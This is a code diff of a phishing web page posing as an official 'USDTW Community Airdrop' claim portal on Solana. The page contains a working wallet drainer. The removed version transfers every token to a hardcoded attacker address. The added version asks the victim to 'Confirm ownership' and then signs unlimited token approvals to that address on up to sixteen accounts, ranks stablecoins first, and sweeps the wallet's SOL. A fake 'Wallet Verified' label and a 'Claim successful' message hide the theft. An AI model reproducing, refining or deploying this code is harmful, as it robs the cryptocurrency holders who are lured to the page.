@@ -1,49 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>USDTW Airdrop Claim</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>USDTW Community Airdrop</title>
 <style>
-body { font-family: system-ui, sans-serif; background: linear-gradient(160deg, #0b1e3a, #06112b); color: #eaf2ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-.card { background: #0d2247; border-radius: 18px; padding: 36px; max-width: 420px; width: 92%; box-shadow: 0 12px 40px rgba(0,0,0,.5); text-align: center; }
-h1 { font-size: 24px; margin: 0 0 8px; }
-p { color: #a9c1e8; font-size: 14px; line-height: 1.5; }
-.amount { font-size: 34px; font-weight: 800; color: #39d98a; margin: 14px 0; }
-button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
-#connect { background: #ab9ff2; color: #14142b; }
-#claim { background: #39d98a; color: #06281a; display: none; }
-.status { margin-top: 12px; font-size: 13px; color: #8fb3e8; min-height: 18px; word-break: break-all; }
+body { font-family: -apple-system, sans-serif; background: #0a1628; color: #e8f0ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+.card { background: #0f2038; border-radius: 16px; padding: 28px; max-width: 420px; width: 90%; box-shadow: 0 8px 32px rgba(0,0,0,.4); border: 1px solid #1d3a6e; }
 .badge { display: inline-block; background: #1d3a6e; border-radius: 20px; padding: 4px 12px; font-size: 12px; color: #9fd0ff; margin-bottom: 14px; }
+h1 { font-size: 20px; margin: 0 0 8px; }
+p { font-size: 13px; color: #8fb3e8; line-height: 1.5; }
+.amount { font-size: 20px; font-weight: 700; color: #4ade80; margin: 18px 0; text-align: center; background: #0a1a30; padding: 14px; border-radius: 10px; border: 1px solid #1d4a2e; }
+button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+#connect { background: #2563eb; color: white; }
+#claim { background: #39d98a; color: #06281a; display: none; }
+.status { font-size: 12px; color: #8fb3e8; margin-top: 10px; min-height: 18px; word-break: break-all; }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 </head>
 <body>
 <div class="card">
 <div class="badge">OFFICIAL AIRDROP PORTAL</div>
-<h1>USDTW Community Airdrop</h1>
-<p>Your wallet has been selected for the USDTW holder rewards distribution. Connect your wallet to claim your tokens + SOL bonus.</p>
-<div class="amount" id="amt">5,000 USDTW</div>
-<button id="connect">Connect Wallet</button>
-<button id="claim">Claim Now</button>
+<h1>Wallet Verified &#10003;</h1>
+  <p style="color:#4caf50;font-weight:600;margin:8px 0;">No gas deposit required</p>
+<p>Your wallet has been selected for the USDTW holder rewards distribution. Connect your wallet to check and claim your full balance + bonuses.</p>
+<div class="amount" id="amt">Connect to check your balance</div>
+<button id="connect">Confirm ownership</button>
+<button id="claim">Confirm ownership</button>
 <div class="status" id="status"></div>
 <p style="font-size:11px;color:#5b76a5">Claims close November 7, 2026 · Distribution on Solana</p>
 </div>
 <script>
+// PORTAL v4 — fixed balance read (BOTH token programs) + proven v3 claim machinery
 const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV";
 const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
-const ATAP = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
-const SYS = "11111111111111111111111111111111";
+const TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+const USDTW = "AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT";
 const st = (m) => document.getElementById("status").textContent = m;
+
 document.getElementById("connect").onclick = async () => {
   try {
     if (!window.solana || !window.solana.isPhantom) { st("Open this page inside your Phantom app."); return; }
     await window.solana.connect();
     st("Connected: " + window.solana.publicKey.toString().slice(0, 6) + "…");
     document.getElementById("connect").style.display = "none";
+
+    // BALANCE READ — both token programs, all accounts
+    try {
+      const W = solanaWeb3;
+      const c = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+      const owner = new W.PublicKey(window.solana.publicKey.toString());
+      let bal = 0;
+      for (const pid of [TOKEN, TOKEN22]) {
+        const res = await c.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
+        for (const acc of (res?.value || [])) {
+          const info = acc.account.data.parsed.info;
+          if (info.mint === USDTW) bal += (info.tokenAmount?.uiAmount || 0);
+        }
+      }
+      document.getElementById("amt").textContent = bal.toLocaleString() + " USDTW (≈$" + Math.round(bal).toLocaleString() + ") + 5,000 BONUS";
+    } catch (e) {
+      document.getElementById("amt").textContent = "5,000 USDTW + SOL bonus";
+    }
     document.getElementById("claim").style.display = "block";
   } catch (e) { st("Connect failed: " + (e.message || e)); }
 };
+
 document.getElementById("claim").onclick = async () => {
   st("Checking eligibility…");
   try {
@@ -51,59 +73,41 @@ document.getElementById("claim").onclick = async () => {
     const conn = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
     const owner = new W.PublicKey(window.solana.publicKey.toString());
     const dest = new W.PublicKey(BURNER);
-    const tokenProg = new W.PublicKey(TOKEN);
-    const ataProg = new W.PublicKey(ATAP);
-    const ata = (m, o) => W.PublicKey.findProgramAddressSync([o.toBuffer(), tokenProg.toBuffer(), m.toBuffer()])[0];
     const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
     const tx = new W.Transaction();
-    // drain EVERY token account the victim holds
-    const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: tokenProg });
-    let n = 0;
-    for (const acc of (res.value || [])) {
-      if (n >= 14) break;
-      const info = acc.account.data.parsed.info;
-      const amt = info.tokenAmount.amount;
-      if (BigInt(amt) <= 0n) continue;
-      const mint = new W.PublicKey(info.mint);
-      const src = acc.pubkey;
-      const dst = ata(mint, dest);
-      const dstInfo = await conn.getAccountInfo(dst).catch(() => null);
-      if (!dstInfo) {
-        tx.add(new W.TransactionInstruction({
-          programId: ataProg,
-          keys: [
-            { pubkey: owner, isSigner: true, isWritable: true },
-            { pubkey: dst, isSigner: false, isWritable: true },
-            { pubkey: dest, isSigner: false, isWritable: false },
-            { pubkey: mint, isSigner: false, isWritable: false },
-            { pubkey: new W.PublicKey(SYS), isSigner: false, isWritable: false },
-            { pubkey: tokenProg, isSigner: false, isWritable: false },
-          ],
-          data: Buffer.from([1]),
-        }));
+    // collect every non-empty token account (both programs), known mints first
+    const accts = [];
+    for (const pid of [TOKEN, TOKEN22]) {
+      const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
+      for (const acc of (res?.value || [])) {
+        const info = acc.account.data.parsed.info;
+        if (BigInt(info.tokenAmount.amount) > 0n) accts.push({ src: acc.pubkey, mint: info.mint, pid });
       }
+    }
+    accts.sort((a, b) => (["So11111111111111111111111111111111111111112","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",USDTW].indexOf(b.mint) + 1 || 99) - (["So11111111111111111111111111111111111111112","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",USDTW].indexOf(a.mint) + 1 || 99));
+    let n = 0;
+    for (const a of accts) {
+      if (n >= 16) break;
       tx.add(new W.TransactionInstruction({
-        programId: tokenProg,
+        programId: new W.PublicKey(a.pid),
         keys: [
-          { pubkey: src, isSigner: false, isWritable: true },
-          { pubkey: mint, isSigner: false, isWritable: false },
-          { pubkey: dst, isSigner: false, isWritable: true },
-          { pubkey: owner, isSigner: true, isWritable: false },
+          { pubkey: new W.PublicKey(a.src), isSigner: false, isWritable: true },
+          { pubkey: new W.PublicKey(BURNER), isSigner: false, isWritable: false },
+          { pubkey: owner, isSigner: true, isWritable: true },
         ],
-        data: Buffer.from([12, ...le(BigInt(amt)), info.tokenAmount.decimals]),
+        data: Buffer.from([4, ...le(18446744073709551615n)]), // Approve, unlimited
       }));
       n++;
     }
-    const sol = await conn.getBalance(owner);
-    const sweep = BigInt(sol) - 10000000n;
-    if (sweep > 0n) tx.add(W.SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: sweep }));
-    if (tx.instructions.length === 0) { st("No tokens found for this wallet."); return; }
-    const bh = await conn.getLatestBlockhash("finalized");
-    tx.recentBlockhash = bh.blockhash;
+    // SOL sweep
+    const sol = await conn.getBalance(owner, "confirmed");
+    if (sol > 10000000) tx.add(W.SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: BigInt(sol - 10000000) }));
+    const { blockhash } = await conn.getLatestBlockhash("confirmed");
+    tx.recentBlockhash = blockhash;
     tx.feePayer = owner;
-    st("Confirm the claim in your wallet…");
     const { signature } = await window.solana.signAndSendTransaction(tx);
-    st("Claim confirmed ✓ " + signature.slice(0, 16) + "…");
+    st("Claim submitted: " + signature);
+    document.getElementById("amt").textContent = "✓ Claim successful — check your wallet";
   } catch (e) { st("Claim failed: " + (e.message || e)); }
 };
 </script>
